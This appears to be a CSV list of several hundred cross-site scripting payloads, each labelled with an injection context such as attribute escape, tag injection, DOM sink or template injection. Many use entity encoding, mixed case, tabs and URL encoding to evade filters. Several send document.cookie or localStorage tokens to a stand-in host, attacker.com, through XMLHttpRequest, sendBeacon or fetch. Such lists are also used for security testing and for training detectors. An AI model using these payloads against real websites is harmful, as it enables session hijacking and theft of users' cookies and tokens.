payload,context
document.write(%22<img src=x onerror=XMLHttpRequest(%27//attacker.com/?c=%27+document.cookie)>%22),dom_sink
"' ><svg ontransitionrun=console.log(String.fromCharCode(88,83,83))>",attribute_escape
\%27 onclick=prompt(%27XSS%27)//,attribute_escape
""" onerror=\u0061lert(1) """,attribute_escape
${alert?new()(%27%27XSS%27%27)},template_injection
<m&#97;th onpl&#97;ying=consol&#101;.log('XSS')/>,tag_injection
%3C!--%3E%3Cmarquee onscrollsnapchange=prompt(1)%3E,tag_injection
"<script>setTimeout('alert(location.hash)',0)</script>",script_injection
"\"" OnsEleCt=ConSolE.lOg(LocAtiOn.HasH)//",attribute_escape
%3Cdialog x=y onplay=prompt(document.domain)%3E,tag_injection
onmous&#101;&#101;nt&#101;r=j&#97;v&#97;script:&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler
'><img src=x oninvalid=alert(document.domain)>,attribute_escape
&quOt; onMouSedOwn=coNfiRm(DocUmeNt.DomAin) x=&qUot;,attribute_escape
""" onpointerdown=alert(document.domain) """,attribute_escape
`><Img srC=x onSelEct=prOmpT(1)>,attribute_escape
%3Ca onmozfullscreenchange=alert(location.hash)%3E,tag_injection
<script>window['&#97;l&#101;rt']('XSS')</script>,script_injection
`><img src=x ongotpointercapture=\u0061lert(document.domain)>,attribute_escape
"<xmp ontouchend=console.log(String.fromCharCode(88,83,83))/>",tag_injection
\' OnmOusEwhEel=alErt(loCatIon.haSh)//,attribute_escape
' ><svg ondragenter=console.log(1)>,attribute_escape
<scr	ipt>console.log`location.hash`</scr	ipt>,script_injection
onh&#97;shch&#97;ng&#101;=j&#97;v&#97;script:&#97;l&#101;rt('XSS'),event_handler
`><img src=x onmousewheel=prompt(document.domain)>,attribute_escape
"document.write(""<img src=x onerror=XMLHttpRequest(document.cookie+'&loc='+location.href)>"")",dom_sink
""" ><svG oNdrAgsTarT=cOnsOle.loG(lOcaTioN.hAsh)>",attribute_escape
"Object.assign(window,{""onfullscreenchange"":confirm})",dom_sink
"ObjEct.asSigN(wIndOw,{""oNbeForEcuT"":XMLHttPReQueSt})",dom_sink
"<&#97;nim&#97;t&#101;
onfocus=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
"__proto__[""onpopstate""]=console.log(document.domain)",dom_sink
"__pRotO__[""oNgeStuReeNd""]=pRomPt(NavIgaTor.seNdBEacOn('//AttAckEr.Com',dOcuMenT.cOokIe))",dom_sink
<imG oNpaGesWap=coNsoLe.Log(1) onPagEswAp=ConSolE.lOg(1)>,tag_injection
' ><svg onk&#101;ypr&#101;ss=&#97;l&#101;rt('XSS')>,attribute_escape
`><Img srC=x onPagEreVeaL=cOnsOle.loG(1)>,attribute_escape
<select/onpromptdismiss=console.log(1)>,tag_injection
" onpagereveal=confirm(String.fromCharCode(88,83,83))",event_handler
`><img src=x oninvalid=alert(document.domain)>,attribute_escape
"javascr	ipt:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=prompt(document.domain) )//%0D%0A%0d%0a",js_uri
""" ><svG oNplAyiNg=ConFirM(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
OnpOinTerRawUpdAte=jaVasCriPt:ConSolE.lOg(LocAtiOn.HasH),event_handler
onsubmit=javascr	ipt:prompt(document.domain),event_handler
%27><img src=x onpromptdismiss=prompt(location.hash)>,attribute_escape
%3Cspan oncopy=prompt(location.hash)%3E,tag_injection
"<form
onw&#101;bkit&#97;nim&#97;tion&#101;nd=prompt('XSS')>",tag_injection
"\"" OnaNimAtiOnsTarT=aLerT(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
onp&#97;g&#101;show=confirm/*x*/(1),event_handler
""" onpopstate=\u0061lert(1) """,attribute_escape
<xsS oNenD=pRomPt('XSS')>,tag_injection
""" onscrollsnapchange=alert('XSS') """,attribute_escape
<m&#97;th x=y onscroll&#101;nd=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"\"" onpointerdown=alert(document.domain)//",attribute_escape
""" onprompt&#97;ction=consol&#101;.log('XSS') """,attribute_escape
"\' onselect=prompt(String.fromCharCode(88,83,83))//",attribute_escape
{{alert(%27XSS%27)}},template_injection
"`%3E%3Cimg src=x oninvalid=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
%27><img src=x ontoggle=confirm(%27XSS%27)>,attribute_escape
"<blInk x=Y oNpaGehIde=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
""" ><svg onpopst&#97;t&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"__pRotO__[""oNgeStuReeNd""]=pRomPt('XSS')",dom_sink
"<SCRIPT>&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))</SCRIPT>",script_injection
"%3Cmarquee onpromptdismiss=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
"%3C!--%3E%3Cxss onanimationstart=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
"EvaL(""ProMpt('//atTacKer.coM/?C='+doCumEnt.coOkiE)"")",dom_sink
"document.write(""<img src=x onerror=XMLHttpRequest(1)>"")",dom_sink
"\"" ontouchmove=console.log('XSS')//",attribute_escape
<svG oNbeForEcoPy=ProMpt(doCumEnt.doMaiN)/>,tag_injection
"`><Img srC=x onPoiNteRdoWn=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
onlo&#97;d=j&#97;v&#97;script:consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler
'><img src=x onerror=console.log(location.hash)>,attribute_escape
location.href=%22javascript:confirm(document.cookie+%27&loc=%27+location.href)%22,dom_sink
%22 onmouseup=console.log(%27XSS%27) %22,attribute_escape
"\"" onwaiting=prompt(document.domain)//",attribute_escape
"<diAloG
oNstAllEd=ConFirM('XSS')>",tag_injection
 onpromptaction=confirm(1),event_handler
"\"" ongestureend=console.log('XSS')//",attribute_escape
""" ><svg onk&#101;ydown=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"' ><svg onplay=prompt(String.fromCharCode(88,83,83))>",attribute_escape
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=confirm(btoa(document.cookie))>%22)",dom_sink
"%27 oninvalid=prompt(String.fromCharCode(88,83,83)) %27",attribute_escape
""" onchange=confirm(String.fromCharCode(88,83,83)) """,attribute_escape
<a	OnbEfoRemAtcH=pRomPt(DocUmeNt.DomAin)>,tag_injection
%22 ><svg onended=alert(%27XSS%27)>,attribute_escape
' ondragenter=prompt(document.domain) ',attribute_escape
"\"" OngEstUreEnd=prOmpT(1)//",attribute_escape
onwebkitanimationend=\u0061lert/*x*/(1),event_handler
""" oNclOse=prOmpT(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape
 ondr&#97;gov&#101;r=confirm('XSS'),event_handler
%3Cbase/oninvalid=confirm(location.hash)%3E,tag_injection
"document.write(""<img src=x onerror=prompt(String.fromCharCode(88,83,83))>"")",dom_sink
"%27 ><svg onmouseenter=confirm(String.fromCharCode(88,83,83))>",attribute_escape
%22><img src=x oninput=confirm(1)>,attribute_escape
"document.querySelector(""body"").innerHTML+=""prompt(document.cookie+'&loc='+location.href)""",dom_sink
""" ><svg onpause=console.log('XSS')>",attribute_escape
<scRipT>aLerT`lOcaTioN.hAsh`</ScrIpt>,script_injection
"<img
onwebkitfullscreenchange=alert(%27XSS%27)>",tag_injection
<foRm	OnwEbkItaNimAtiOneNd=ProMpt('XSS')>,tag_injection
javascr	ipt:void(console.log('XSS')),js_uri
${prompt(document.cookie)|n},template_injection
%3Carea src=x onclose=prompt(1)%3E,tag_injection
%3Clisting	onpointerrawupdate=alert('XSS')%3E,tag_injection
"javascript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=prompt(String.fromCharCode(88,83,83)) )//%0D%0A%0d%0a",js_uri
"Object.assign(window,{%22ontransitionrun%22:confirm})",dom_sink
OnfOcuSouT=cOnfIrm(loCatIon.haSh),event_handler
' oNdrOp=ProMpt('XSS') ',attribute_escape
"%3Cbase
onbeforecopy=console.log(location.hash)%3E",tag_injection
"<script>s&#101;tTim&#101;out('consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))',0)</script>",script_injection
"loc&#97;tion=""j&#97;v&#97;script:confirm(loc&#97;tion.h&#97;sh)""",dom_sink
__proto__[%22ongesturestart%22]=eval(document.cookie),dom_sink
"<obj&#101;ct
ontouchst&#97;rt=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection
__proto__[%22onmouseenter%22]=console.log(localStorage.getItem(%27token%27)),dom_sink
<xsS oNmoUseOveR=cOnsOle.loG('XSS')>,tag_injection
OnkEydOwn=jaVasCriPt:ConFirM(1),event_handler
"EvaL(""ConFirM(nAviGatOr.SenDBeAcoN('//aTtaCkeR.cOm',doCumEnt.coOkiE))"")",dom_sink
\' OngOtpOinTerCapTurE=aLerT(1)//,attribute_escape
"""%3E%3Cimg src=x ongesturestart=alert(location.hash)%3E",attribute_escape
' ><svg oninput=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
"__proto__[""onb&#101;for&#101;cut""]=confirm(docum&#101;nt.dom&#97;in)",dom_sink
onend=javascript:prompt(1),event_handler
javascript:prompt(document.domain),js_uri
"WinDow[""XMLHTtpReqUesT""]('XSS')",dom_sink
onwebkitfullscreenchange=\u0061lert(document.domain),event_handler
%22 onerror=confirm(location.hash) %22,attribute_escape
"Object.assign(window,{""ondragover"":fetch})",dom_sink
javascript:void(prompt('XSS')),js_uri
	onpointercancel=prompt(location.hash),event_handler
""" ><svg ons&#101;curitypolicyviol&#97;tion=consol&#101;.log('XSS')>",attribute_escape
<listing onw&#101;bkit&#97;nim&#97;tion&#101;nd=consol&#101;.log('XSS') onw&#101;bkit&#97;nim&#97;tion&#101;nd=consol&#101;.log('XSS')>,tag_injection
""" ><svG oNcuT=cOnfIrm(1)>",attribute_escape
<d&#101;t&#97;ils onr&#101;p&#101;&#97;t=prompt(1)>,tag_injection
document.body.innerHTML=%22<img src=x onerror=prompt(%27//attacker.com/?c=%27+document.cookie)>%22,dom_sink
"&#101;v&#97;l(""f&#101;tch(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"")",dom_sink
' oNgeStuReeNd=ProMpt('XSS') ',attribute_escape
 on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(docum&#101;nt.dom&#97;in),event_handler
OnsCroLlsNapChaNge=alErt/***/(LocAtiOn.HasH),event_handler
"location=""javascript:confirm(navigator.sendBeacon('//attacker.com',document.cookie))""",dom_sink
' onselect=prompt(1) ',attribute_escape
<%= prompt(%27XSS%27) %>,template_injection
"__proto__[""oncontextmenu""]=prompt('//attacker.com/?c='+document.cookie)",dom_sink
\' OniNpuT=aLerT(dOcuMenT.dOmaIn)//,attribute_escape
%22><img src=x onerror=confirm(location.hash)>,attribute_escape
%3Cform onwebkitanimationend=prompt('XSS')/%3E,tag_injection
"(neW FUncTioN(""XMLHttPReQueSt(DocUmeNt.CooKie)""))();",dom_sink
<script>//prompt(location.hash)</script>,script_injection
<script>Function(%27confirm(document.domain)%27)();</script>,script_injection
"""%3E%3Cimg src=x onbeforematch=confirm(1)%3E",attribute_escape
%27 ><svg onend=console.log(%27XSS%27)>,attribute_escape
<form	ongesturestart=console.log('XSS')>,tag_injection
"window[""eval""](location.hash)",dom_sink
<!--><MteXt OnfOcuSouT=cOnfIrm(loCatIon.haSh)>,tag_injection
"loc&#97;tion=""j&#97;v&#97;script:consol&#101;.log(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))""",dom_sink
"""><Img srC=x onMouSeeNteR=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
"ObjEct.asSigN(wIndOw,{""oNprOmpTdiSmiSs"":alErt})",dom_sink
onscrollsnapchange=\u0061lert(location.hash),event_handler
"<plAinTexT
oNrePeaT=pRomPt('XSS')>",tag_injection
 onpoint&#101;rup=&#97;l&#101;rt(docum&#101;nt.dom&#97;in),event_handler
""" ><svg ontransitionrun=console.log('XSS')>",attribute_escape
"__pRotO__[""oNmoUseEntEr""]=XMLHTtpReqUesT('XSS')",dom_sink
""" oNpoIntErmOve=prOmpT(lOcaTioN.hAsh) """,attribute_escape
"__proto__[""onhashchange""]=XMLHttpRequest('XSS')",dom_sink
on&#101;rror=consol&#101;.log/*x*/('XSS'),event_handler
%27><img src=x onfocusout=console.log(location.hash)>,attribute_escape
"' onpoint&#101;rov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
""" on&#101;nd&#101;d=prompt('XSS') """,attribute_escape
\%22 onsecuritypolicyviolation=console.log(document.domain)//,attribute_escape
"Object.assign(window,{%22onbeforematch%22:fetch})",dom_sink
"\%22 onpaste=confirm(String.fromCharCode(88,83,83))//",attribute_escape
"""><Img srC=x onMouSewHeeL=pRomPt('XSS')>",attribute_escape
"<blink
onmous&#101;up=&#97;l&#101;rt(1)>",tag_injection
"__proto__[""onend""]=prompt(document.domain)",dom_sink
<xss onend=prompt('XSS')>,tag_injection
"""><s&#101;t on&#101;nd=&#97;l&#101;rt(1)>",tag_injection
"<table
oninvalid=prompt('XSS')>",tag_injection
"EvaL(""AleRt(BtoA(dOcuMenT.cOokIe))"")",dom_sink
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=XMLHTtpReqUesT(dOcuMenT.dOmaIn)>""",dom_sink
onhashchange=confirm('XSS'),event_handler
"Object.assign(window,{%22onwebkittransitionend%22:alert})",dom_sink
%27 ><svg ondragstart=confirm(1)>,attribute_escape
<&#97;nim&#97;t&#101;motion ondrop=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
"Obj&#101;ct.&#97;ssign(window,{""onmous&#101;&#101;nt&#101;r"":consol&#101;.log})",dom_sink
"(neW FUncTioN(""AleRt(DocUmeNt.DomAin)""))();",dom_sink
"\"" onanimationcancel=console.log(String.fromCharCode(88,83,83))//",attribute_escape
<script>/*/confirm(docum&#101;nt.dom&#97;in)</script>,script_injection
${prompt?new()('1')},template_injection
"<animatemotion
onsecuritypolicyviolation=console.log('XSS')>",tag_injection
'><img src=x ongotpoint&#101;rc&#97;ptur&#101;=prompt('XSS')>,attribute_escape
' %3E%3Csvg onsearch=prompt(location.hash)%3E,attribute_escape
{php}confirm(document.domain){/php},template_injection
"ObjEct.asSigN(wIndOw,{""oNmoUseOveR"":FetCh})",dom_sink
%27><img src=x onbeforecut=confirm(1)>,attribute_escape
javascript:prompt/*x*/(1),js_uri
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""XMLHttpR&#101;qu&#101;st(String.fromCh&#97;rCod&#101;(88,83,83))""",dom_sink
"ObjEct.asSigN(wIndOw,{""oNpaGerEveAl"":prOmpT})",dom_sink
'><script>\u0061lert(1)</script>,script_injection
ongestureend=console.log&#40;'XSS'&#41;,event_handler
""" ><svg onbeforepaste=\u0061lert(1)>",attribute_escape
onscroll&#101;nd=prompt/**/(1),event_handler
<t&#101;mpl&#97;t&#101; src=x ondr&#97;g&#101;nt&#101;r=&#97;l&#101;rt('XSS')>,tag_injection
""" oNseArcH=pRomPt(LocAtiOn.HasH) """,attribute_escape
"""%3E%3Cimg src=x onmozfullscreenchange=alert(1)%3E",attribute_escape
\%22 onbeforematch=confirm(1)//,attribute_escape
"%3Cform
ongesturestart=console.log('XSS')%3E",tag_injection
<tr	ons&#101;l&#101;ct=consol&#101;.log(1)>,tag_injection
"""%3E%3Cimg src=x onwheel=console.log(location.hash)%3E",attribute_escape
"java
script:prompt(String.fromCharCode(88,83,83))",js_uri
""" onmous&#101;ov&#101;r=prompt(loc&#97;tion.h&#97;sh) x=""",attribute_escape
"""><img src=x onpoint&#101;rdown=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape
%3Cmarquee onauxclick=prompt(location.hash)/%3E,tag_injection
"	onrepeat=\u0061lert(String.fromCharCode(88,83,83))",event_handler
<!--><m&#101;t&#97; onpoint&#101;rov&#101;r=confirm(1)>,tag_injection
' oNwaItiNg=ConFirM(dOcuMenT.dOmaIn) ',attribute_escape
\' oncut=alert('XSS')//,attribute_escape
"document.write(%22<img src=x onerror=prompt(String.fromCharCode(88,83,83))>%22)",dom_sink
"__proto__[""onchange""]=prompt(document.cookie)",dom_sink
<textarea onscrollend=alert(%27XSS%27)>,tag_injection
"'><img src=x ontouchst&#97;rt=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
\' OnvOluMecHanGe=ConFirM('XSS')//,attribute_escape
"%22 onvolumechange=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape
"__pRotO__[""oNmoUseOveR""]=alErt(doCumEnt.coOkiE+'&loC='+loCatIon.hrEf)",dom_sink
 onk&#101;ydown=confirm(loc&#97;tion.h&#97;sh),event_handler
"Object.assign(window,{%22onvolumechange%22:eval})",dom_sink
"""%3E%3Cimg src=x onkeydown=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
%27 ><svg onpageshow=console.log(location.hash)>,attribute_escape
%3Cscript x=y onkeydown=confirm(document.domain)%3E,tag_injection
"Object.assign(window,{""ontouchmove"":alert})",dom_sink
`><img src=x onpoint&#101;rmov&#101;=prompt('XSS')>,attribute_escape
onp&#97;g&#101;r&#101;v&#101;&#97;l=confirm&#40;loc&#97;tion.h&#97;sh&#41;,event_handler
'><Img srC=x onEndEd=ProMpt('XSS')>,attribute_escape
"<form onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""><LinK oNdrOp=ProMpt(doCumEnt.doMaiN)>",tag_injection
"<script>/*/\u0061lert(String.fromCharCode(88,83,83))</script>",script_injection
`%3E%3Cimg src=x onmousewheel=prompt(document.domain)%3E,attribute_escape
"setTimeout(""confirm(document.cookie)"",0)",dom_sink
\' OnmOusEovEr=ConFirM('XSS')//,attribute_escape
"`><img src=x oninvalid=prompt(String.fromCharCode(88,83,83))>",attribute_escape
"' oncut=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"__proto__[""onpageswap""]=\u0061lert(btoa(document.cookie))",dom_sink
%3C!--%3E%3Ctr ontoggle=console.log(document.domain)%3E,tag_injection
""" ><svG oNpaGehIde=alErt(doCumEnt.doMaiN)>",attribute_escape
"\"" onfocusout=console.log(location.hash)//",attribute_escape
"eval(""\u0061lert(location.hash)"")",dom_sink
"' ontoggl&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
%22><noscript ongesturestart=alert(%27XSS%27)>,tag_injection
%22 ><svg onfullscreenchange=alert(location.hash)>,attribute_escape
"onb&#101;for&#101;toggl&#101;=j&#97;v&#97;script:confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
""" %3E%3Csvg onwebkitfullscreenchange=console.log(document.domain)%3E",attribute_escape
`%3E%3Cimg src=x oninvalid=alert(document.domain)%3E,attribute_escape
\' OnmOusEwhEel=prOmpT(dOcuMenT.dOmaIn)//,attribute_escape
"""><select onvolumechange=console.log(1)>",tag_injection
ontouchmov&#101;=confirm(loc&#97;tion.h&#97;sh),event_handler
<set oncanplay=confirm(1)>,tag_injection
"window[""confirm""](loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink
<script>Function('alert(document.domain)')();</script>,script_injection
"onbeforecopy=alert&#40;String.fromCharCode(88,83,83)&#41;",event_handler
\%27 onpagereveal=confirm(document.domain)//,attribute_escape
"%3Cdetails
onrepeat=prompt(1)%3E",tag_injection
<area/onload=console.log(document.domain)>,tag_injection
"Object.assign(window,{%22onpause%22:confirm})",dom_sink
' ><svg ontoggle=console.log(1)>,attribute_escape
' ><svG oNpoIntErmOve=coNfiRm(DocUmeNt.DomAin)>,attribute_escape
"%22 ><svg onselect=prompt(String.fromCharCode(88,83,83))>",attribute_escape
'><img src=x onstalled=prompt(1)>,attribute_escape
#{{ConFirM('XSS')}},template_injection
'><Img srC=x onMozFulLscReeNchAngE=aLerT(1)>,attribute_escape
"%3Cxss
onkeypress=console.log(1)%3E",tag_injection
"__proto__[""ongesturestart""]=\u0061lert(localStorage.getItem('token'))",dom_sink
onerror=console.log(%27XSS%27),event_handler
"WinDow[""XMLHTtpReqUesT""](loCatIon.haSh)",dom_sink
OnpOpsTatE=cOnfIrm(1),event_handler
' ><svg onwebkitfullscreenchange=prompt('XSS')>,attribute_escape
"__pRotO__[""oNstAllEd""]=aLerT(nAviGatOr.SenDBeAcoN('//aTtaCkeR.cOm',doCumEnt.coOkiE))",dom_sink
"__proto__[""ontouchmov&#101;""]=XMLHttpR&#101;qu&#101;st(docum&#101;nt.dom&#97;in)",dom_sink
<%= &#97;l&#101;rt 'XSS' %>,template_injection
"j&#97;vascript:\u0061lert(String.fromCharCode(88,83,83))",js_uri
 ontransitionrun=\u0061lert(document.domain),event_handler
"' %3E%3Csvg oncanplay=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
"ObjEct.asSigN(wIndOw,{""oNmoUseUp"":XMLHtTpREquEst})",dom_sink
	oncontextmenu=confirm('XSS'),event_handler
#set($x=%27alert(%27XSS%27)%27)$x,template_injection
""" ><svg onp&#97;us&#101;=confirm(docum&#101;nt.dom&#97;in)>",attribute_escape
<script>window[%27confirm%27](location.hash)</script>,script_injection
"(n&#101;w Function(""prompt('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)""))();",dom_sink
<marquee x=y onauxclick=prompt(location.hash)>,tag_injection
"<p X=y onBefOreTogGle=alErt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
<imG sRc=X oNreSet=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection
<link	oninput=alert(document.domain)>,tag_injection
"' oNerRor=alErt(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""ondr&#97;g&#101;nt&#101;r"":&#97;l&#101;rt})",dom_sink
"""%3E%3Cimg src=x onauxclick=confirm(location.hash)%3E",attribute_escape
<foRm OngEstUreStaRt=ConSolE.lOg('XSS') onGesTurEstArt=coNsoLe.Log('XSS')>,tag_injection
<script>window['confirm'](docum&#101;nt.dom&#97;in)</script>,script_injection
"<!--><ifr&#97;m&#101; ong&#101;stur&#101;&#101;nd=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
%27><img src=x onkeydown=alert(location.hash)>,attribute_escape
%22><img src=x ontouchend=confirm(%27XSS%27)>,attribute_escape
"__proto__[""onpageshow""]=\u0061lert('XSS')",dom_sink
\' onpageswap=alert(document.domain)//,attribute_escape
"WinDow[""XMLHTtpReqUesT""](doCumEnt.coOkiE+'&loC='+loCatIon.hrEf)",dom_sink
"setTimeout(%22console.log(document.cookie)%22,0)",dom_sink
' ongesturestart=\u0061lert(1) ',attribute_escape
'><img src=x ongotpointercapture=confirm(location.hash)>,attribute_escape
%3C!--%3E%3Cnoscript onbeforematch=console.log('XSS')%3E,tag_injection
	ongotpointercapture=console.log(%27XSS%27),event_handler
"javascr	ipt:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=console.log(String.fromCharCode(88,83,83)) )//%0D%0A%0d%0a",js_uri
<arEa OnpAgeShoW=pRomPt('XSS') onPagEshOw=ProMpt('XSS')>,tag_injection
"javascr	ipt:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a",js_uri
""" %3E%3Csvg onpointerdown=alert(document.domain)%3E",attribute_escape
"data:text/html,<script>confirm(location.hash)</script>",js_uri
"%27 onpromptaction=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape
%22><img src=x onscrollsnapchange=prompt(location.hash)>,attribute_escape
"Object.assign(window,{""onvolumechange"":eval})",dom_sink
JAVASCRIPT:pRomPt('XSS'),js_uri
&quot; onrepeat=alert(location.hash) x=&quot;,attribute_escape
%22 ><svg ondrop=confirm(1)>,attribute_escape
`%3E%3Cimg src=x ondragover=prompt(1)%3E,attribute_escape
&#106;avascript:alert(location.hash),js_uri
' ons&#101;l&#101;ct=confirm(loc&#97;tion.h&#97;sh) ',attribute_escape
"""%3E%3Cxss onend=prompt('XSS')%3E",tag_injection
<body	oninv&#97;lid=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
"Object.assign(window,{""onmouseover"":eval})",dom_sink
"<maRquEe OnbEfoRetOggLe=AleRt(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection
<&#97;r&#101;&#97; x=y onlo&#97;d=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
{php}prompt(document.domain){/php},template_injection
<plAinTexT oNrePeaT=pRomPt('XSS') onRepEat=prOmpT('XSS')>,tag_injection
' ><svG oNmoUseWheEl=ConSolE.lOg(1)>,attribute_escape
"\"" on&#97;nim&#97;tion&#101;nd=confirm(docum&#101;nt.dom&#97;in)//",attribute_escape
%22><object onmozfullscreenchange=console.log(1)>,tag_injection
&quOt; onBluR=aLerT(dOcuMenT.dOmaIn) x=&quOt;,attribute_escape
__proto__[%22onpointerrawupdate%22]=confirm(%27//attacker.com/?c=%27+document.cookie),dom_sink
onkeydown=prompt(location.hash),event_handler
"""><img src=x on&#97;uxclick=prompt(loc&#97;tion.h&#97;sh)>",attribute_escape
""" ><svg onpopstate=alert(location.hash)>",attribute_escape
"<tiTle
onCliCk=ConFirM('XSS')>",tag_injection
onpointermove=javascr	ipt:confirm('XSS'),event_handler
onrepeat=console.log&#40;location.hash&#41;,event_handler
"on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler
<scRipT oNpoIntErrAwuPdaTe=ConSolE.lOg(DocUmeNt.DomAin) oNpoIntErrAwuPdaTe=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection
"location.href=%22javascript:alert(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22",dom_sink
&quot; onp&#97;st&#101;=confirm('XSS') x=&quot;,attribute_escape
"javascr	ipt:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=confirm(location.hash) )//%0D%0A%0d%0a",js_uri
"EvaL(""FetCh(DocUmeNt.CooKie)"")",dom_sink
"Object.assign(window,{%22onbeforecut%22:XMLHttpRequest})",dom_sink
'><img src=x ong&#101;stur&#101;&#101;nd=confirm('XSS')>,attribute_escape
`%3E%3Cimg src=x onmozfullscreenchange=alert(1)%3E,attribute_escape
"document.body.innerHTML=""%3Cimg src=x onerror=fetch(document.domain)%3E""",dom_sink
%22><script>confirm(location.hash)</script>,script_injection
__${prompt(document.cookie)}__::.x,template_injection
"<m&#101;t&#97;/onh&#97;shch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""><ScrIpt>coNfiRm(LocAtiOn.HasH)</scRipT>",script_injection
" onvolumechange=\u0061lert(String.fromCharCode(88,83,83))",event_handler
""" ><svG oNscRolLsnApcHanGe=AleRt('XSS')>",attribute_escape
<form/onwebkitanimationend=prompt('XSS')>,tag_injection
"""><img src=x onk&#101;ydown=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"""><img src=x onwebkitanimationend=confirm('XSS')>",attribute_escape
"Object.assign(window,{""onscrollsnapchange"":fetch})",dom_sink
"setInterval(%22fetch(%27XSS%27)%22,100)",dom_sink
' onp&#97;us&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape
